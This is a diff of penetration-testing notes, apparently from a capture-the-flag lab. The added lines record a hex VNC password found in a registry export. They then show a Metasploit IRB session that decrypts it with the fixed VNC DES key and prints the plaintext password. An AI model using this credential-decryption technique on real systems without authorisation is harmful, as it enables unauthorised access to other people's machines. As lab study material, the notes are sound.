@@ -85,7 +85,7 @@ Found
 - Meeting_Notes_June_2018.html
 - ArkAdRecycleBin.log
 - dcdiag.log
-- VNC Install.reg
+- VNC Install.reg ==> found this "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
 - MapAuditDrive.vbs
 - MapDataDrive.vbs
 
@@ -93,3 +93,23 @@ Found
 * Reading the meeting notes html we see that there was a TempAdmin account that was deleted 
 and as we see in a ArkAdRecycleBin.log file user ArkSvc indeed deleted him, maybe restoring the user
 gets us something *
+
+
+* Using a metasploit i was able to decrypt the VNC password (followed this link https://github.com/frizb/PasswordDecrypts) *
+
+[Result: $> msfconsole
+
+msf5 > irb
+[*] Starting IRB shell...
+[*] You are in the "framework" object
+
+>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+ => "\u0017Rk\u0006#NX\a"
+>> require 'rex/proto/rfb'
+ => true
+>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
+ => "sT333ve2"
+>> 
+]
+
+
